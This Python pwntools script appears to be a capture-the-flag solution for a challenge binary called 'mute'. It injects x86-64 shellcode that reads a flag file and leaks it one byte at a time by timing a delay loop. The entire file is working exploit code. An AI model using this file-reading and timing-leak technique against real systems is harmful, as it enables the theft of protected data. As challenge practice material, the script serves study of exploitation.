from pwn import *
import string
import sys
import time

def check(s, i):
    sc_source = '''
xor rax, rax
push rax
mov al, 0x2
mov r8, 0x67616c662f2f2f2e
push r8
mov rdi, rsp
xor rsi, rsi
xor rdx, rdx
syscall
mov rdi, rax
xor rax, rax
mov rsi, rsp
mov dl, 0xff
syscall
xor r8, r8
mov r8d, 0xffffffff
xor rcx, rcx
mov rcx, [rsp + SECTION*8]
shr rcx, SHIFT
cmp cl, TESTCHAR
jz .loop
jmp .fin
.loop:
dec r8
cmp r8, 0
jne .loop
.fin:
'''.replace('SECTION', str(i/8)).replace('SHIFT', str(8*(i%8))).replace('TESTCHAR', str(ord(s)))
    sc = asm(sc_source, arch='amd64', os='linux')
    sc += "\x00"*(0x1000 - len(sc))

    starttime = time.time()
    proc = process('./mute')
    proc.recvline()
    proc.send_raw(sc)

    try:
        proc.recvline()
    except:
        pass
    finally:
        proc.close()
        ellapsed = time.time() - starttime
        print("Ellapsed Time: " + str(ellapsed) + "s")

def main():
    if(len(sys.argv) < 3):
        print("Usage: " + sys.argv[0] + " <Test Char.> <Index>")
        exit(0)

    check(sys.argv[1], int(sys.argv[2]))

if __name__ == '__main__':
    main()
